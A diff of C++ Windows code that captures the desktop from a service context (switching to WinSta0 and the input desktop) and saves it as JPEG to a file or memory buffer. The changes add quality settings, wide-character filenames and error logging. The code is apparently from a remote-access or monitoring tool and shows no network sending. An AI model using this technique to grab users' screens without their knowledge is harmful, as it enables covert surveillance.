@@ -11,24 +11,26 @@ extern "C" {
 #pragma comment(lib, "jpeg.lib")
 #include "macro.h"
 
+#include "error.h"
+
 #include "memory_debug.h"
 
-bool Screen::screenshot(const char *filename){
+bool Screen::screenshot(const wchar_t *filename, int quality){
 	DWORD i = 0;
-	return takeScreenshot(2, filename, 0, i);
+	return takeScreenshot(2, filename, 0, i, quality);
 }
 
 bool Screen::screenshotToConsole(){
 	DWORD i = 0;
-	return takeScreenshot(1, 0, 0, i);
+	return takeScreenshot(1, 0, 0, i, 0);
 }
 
-bool Screen::screenshotToBuffer(char **buffer, DWORD &size){
-	return takeScreenshot(3, 0, buffer, size);
+bool Screen::screenshotToBuffer(char **buffer, DWORD &size, int quality){
+	return takeScreenshot(3, 0, buffer, size, quality);
 }
 
 // outType = 1 : console, 2: file, 3: buffer
-bool Screen::takeScreenshot(const int outType, const char *filename, char **buffer, DWORD &size){
+bool Screen::takeScreenshot(const int outType, const wchar_t *filename, char **buffer, DWORD &size, int quality){
 	if (outType < 1 || outType > 3){
 		return false;
 	}
@@ -40,16 +42,17 @@ bool Screen::takeScreenshot(const int outType, const char *filename, char **buff
 
 
 		// open the WinSta0 as some services are attached to a different window station.
-	HWINSTA hWindowStation = hWindowStation = OpenWindowStation( "WinSta0", FALSE, WINSTA_ALL_ACCESS );
+	HWINSTA hWindowStation = OpenWindowStation( TEXT("WinSta0"), FALSE, WINSTA_ALL_ACCESS );
 	if( !hWindowStation )
 	{
 		if( RevertToSelf() )
-			hWindowStation = OpenWindowStation( "WinSta0", FALSE, WINSTA_ALL_ACCESS );
+			hWindowStation = OpenWindowStation( TEXT("WinSta0"), FALSE, WINSTA_ALL_ACCESS );
 	}
 		
 	// if we cant open the defaut input station we wont be able to take a screenshot
 	if( !hWindowStation ) {
-		MYPRINTF( "[SCREENSHOT] screenshot: Couldnt get the WinSta0 Window Station");
+		MYPRINTF( "[SCREENSHOT] screenshot: Couldnt get the WinSta0 Window Station (%d)\n", GetLastError());
+		GlobalError::saveError(GlobalError::Screen1,  GetLastError());
 		return false;
 	}
 		
@@ -58,7 +61,8 @@ bool Screen::takeScreenshot(const int outType, const char *filename, char **buff
 		
 	// set the host process's window station to this sessions default input station we opened
 	if( !SetProcessWindowStation( hWindowStation ) ){
-		MYPRINTF( "[SCREENSHOT] screenshot: SetProcessWindowStation failed" );
+		MYPRINTF( "[SCREENSHOT] screenshot: SetProcessWindowStation failed (%d)\n", GetLastError());
+		GlobalError::saveError(GlobalError::Screen2,  GetLastError());
 		return false;
 	}
 
@@ -67,7 +71,8 @@ bool Screen::takeScreenshot(const int outType, const char *filename, char **buff
 	//HDESK hInputDesktop = OpenDesktop("Default", 0, FALSE, MAXIMUM_ALLOWED );
 	HDESK hInputDesktop = OpenInputDesktop( 0, FALSE, MAXIMUM_ALLOWED );
 	if( !hInputDesktop ){
-		MYPRINTF( "[SCREENSHOT] screenshot: OpenInputDesktop failed" );
+		MYPRINTF( "[SCREENSHOT] screenshot: OpenInputDesktop failed (%d)\n", GetLastError());
+		GlobalError::saveError(GlobalError::Screen3,  GetLastError());
 		return false;
 	}
 	//if (SwitchDesktop(hInputDesktop) == 0){
@@ -76,14 +81,24 @@ bool Screen::takeScreenshot(const int outType, const char *filename, char **buff
 	//}
 	// get the threads current desktop so we can restore it later on
 	HDESK hOrigDesktop = GetThreadDesktop( GetCurrentThreadId() );
+	if( !hOrigDesktop ){
+		MYPRINTF( "[SCREENSHOT] screenshot: GetThreadDesktop failed (%d)\n", GetLastError());
+		GlobalError::saveError(GlobalError::Screen3,  GetLastError());
+		return false;
+	}
 
 	// set this threads desktop to that of this sessions default input desktop on WinSta0
-	SetThreadDesktop( hInputDesktop );
+	if (!SetThreadDesktop(hInputDesktop)){
+		int error = GetLastError();
+		MYPRINTF( "[SCREENSHOT] screenshot: SetThreadDesktop failed (%d)\n", error);
+		if (error != 170){
+			GlobalError::saveError(GlobalError::Screen4,  error);
+			return false;
+		}
+	}
 
 	// and now we can grab a handle to this input desktop
 	HWND hDesktopWnd = GetDesktopWindow();
-
-
 
 	int screenWidth = GetSystemMetrics (SM_CXSCREEN);
 	int screenHeight = GetSystemMetrics (SM_CYSCREEN);
@@ -93,7 +108,8 @@ bool Screen::takeScreenshot(const int outType, const char *filename, char **buff
 	HDC handleDeviceContextOfScreen = GetDC(hDesktopWnd);
 	//HDC handleDeviceContextOfScreen = CreateDC("DISPLAY",NULL,NULL,NULL);
 	if (handleDeviceContextOfScreen == 0){
-		MYPRINTF("GetDC(0) has failed: %d", GetLastError());
+		MYPRINTF("GetDC(0) has failed: %d\n", GetLastError());
+		GlobalError::saveError(GlobalError::Screen5,  GetLastError());
 		goto done;
 	}
 
@@ -103,8 +119,9 @@ bool Screen::takeScreenshot(const int outType, const char *filename, char **buff
 		HWND  hWnd = GetForegroundWindow();
 
 		HDC handleDeviceContextOfWindow = GetDC(hWnd);
-		if (handleDeviceContextOfScreen == 0){
-			MYPRINTF("GetDC(hWnd) has failed: %d", GetLastError());
+		if (handleDeviceContextOfWindow == 0){
+			MYPRINTF("GetDC(hWnd) has failed: %d\n", GetLastError());
+			GlobalError::saveError(GlobalError::Screen6,  GetLastError());
 			goto done;
 		}
 		RECT rcClient;
@@ -122,7 +139,8 @@ bool Screen::takeScreenshot(const int outType, const char *filename, char **buff
 			screenHeight,
 			SRCCOPY))
 		{
-			MYPRINTF("StretchBlt has failed: %d", GetLastError());
+			MYPRINTF("StretchBlt has failed: %d\n", GetLastError());
+			GlobalError::saveError(GlobalError::Screen7,  GetLastError());
 			goto done;
 		}
 		result = true;
@@ -130,7 +148,8 @@ bool Screen::takeScreenshot(const int outType, const char *filename, char **buff
 		// Create a compatible DC which is used in a BitBlt from the window DC
 		handleMemoryDC = CreateCompatibleDC(handleDeviceContextOfScreen);
 		if(!handleMemoryDC) {
-			MYPRINTF("CreateCompatibleDC has failed: %d", GetLastError());
+			MYPRINTF("CreateCompatibleDC has failed: %d\n", GetLastError());
+			GlobalError::saveError(GlobalError::Screen8,  GetLastError());
 			goto done;
 		}
 		BITMAPINFO		bmpinfo;
@@ -138,7 +157,7 @@ bool Screen::takeScreenshot(const int outType, const char *filename, char **buff
 		LONG dwWidth = GetDeviceCaps(handleDeviceContextOfScreen, HORZRES);
 		LONG dwHeight = GetDeviceCaps(handleDeviceContextOfScreen, VERTRES);
 		//dwBPP = GetDeviceCaps(hScreen, BITSPIXEL);
-		LONG dwBPP = 24;
+		LONG dwBPP = GetDeviceCaps(handleDeviceContextOfScreen, BITSPIXEL);// 24 ?
 		LONG dwNumColors = GetDeviceCaps(handleDeviceContextOfScreen, NUMCOLORS);
 		LPVOID			pBits;
 		bmpinfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
@@ -163,8 +182,14 @@ bool Screen::takeScreenshot(const int outType, const char *filename, char **buff
 		}
 		*/
 		// Select the compatible bitmap into the compatible memory DC.
-		if (SelectObject(handleMemoryDC, handleBitmapScreen) == 0){
-			MYPRINTF("SelectObject Failed: %d", GetLastError());
+		HGDIOBJ gdiObj = SelectObject(handleMemoryDC, handleBitmapScreen);
+		if (gdiObj == 0){
+			MYPRINTF("SelectObject Failed: %d\n", GetLastError());
+			GlobalError::saveError(GlobalError::Screen9,  GetLastError());
+			goto done;
+		} else if (gdiObj == HGDI_ERROR){
+			MYPRINTF("SelectObject Failed (HGDI_ERROR): %d\n", GetLastError());
+			GlobalError::saveError(GlobalError::Screen10,  GetLastError());
 			goto done;
 		}
 
@@ -175,13 +200,16 @@ bool Screen::takeScreenshot(const int outType, const char *filename, char **buff
 			handleDeviceContextOfScreen,
 			0, 0,
 			SRCCOPY)) {
-				MYPRINTF("BitBlt has failed: %d", GetLastError());
+				DWORD lastError = GetLastError();
+				MYPRINTF("BitBlt has failed: %d\n", lastError);
+				GlobalError::saveError(GlobalError::Screen11, lastError);
 				goto done;
 		}
 		BITMAP bmpScreen;
 		// Get the BITMAP from the HBITMAP
 		if (GetObject(handleBitmapScreen, sizeof(BITMAP), &bmpScreen) == 0){
-				MYPRINTF("GetObject has failed: %d", GetLastError());
+				MYPRINTF("GetObject has failed: %d\n", GetLastError());
+				GlobalError::saveError(GlobalError::Screen12,  GetLastError());
 				goto done;
 		}
 
@@ -202,13 +230,13 @@ bool Screen::takeScreenshot(const int outType, const char *filename, char **buff
 
 		DWORD dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;
 
-		HANDLE hData = GlobalAlloc(GHND,dwBmpSize); 
+		HANDLE hData = GlobalAlloc(GHND, dwBmpSize); 
 		char *bmpdata = (char *)GlobalLock(hData); 
 
 		// Starting with 32-bit Windows, GlobalAlloc and LocalAlloc are implemented as wrapper functions that 
 		// call HeapAlloc using a handle to the process's default heap. Therefore, GlobalAlloc and LocalAlloc 
 		// have greater overhead than HeapAlloc.
-		HANDLE hDIB = GlobalAlloc(GHND,dwBmpSize); 
+		HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize); 
 		char *lpbitmap = (char *)GlobalLock(hDIB);    
 
 		// Gets the "bits" from the bitmap and copies them into a buffer 
@@ -244,14 +272,16 @@ bool Screen::takeScreenshot(const int outType, const char *filename, char **buff
 
 		if (outType == 2){
 			// Now convert to JPEG
-			if (bmp2jpegtofile((PBYTE)bmpdata, 70, filename ) == 0){
-				MYPRINTF("unable to write jpg");
+			if (bmp2jpegtofile((PBYTE)bmpdata, quality, filename ) == 0){
+				MYPRINTF("unable to write jpg\n");
+				GlobalError::saveError(GlobalError::Screen13);
 			} else {
 				result = true;
 			}
 		} else {
-			if (bmp2jpegtomemory((PBYTE)bmpdata, 70, (BYTE **)buffer, &size) == 0){
-				MYPRINTF("unable to write jpg");
+			if (bmp2jpegtomemory((PBYTE)bmpdata, quality, (BYTE **)buffer, &size) == 0){
+				MYPRINTF("unable to write jpg\n");
+				GlobalError::saveError(GlobalError::Screen14);
 			} else {
 				result = true;
 			}
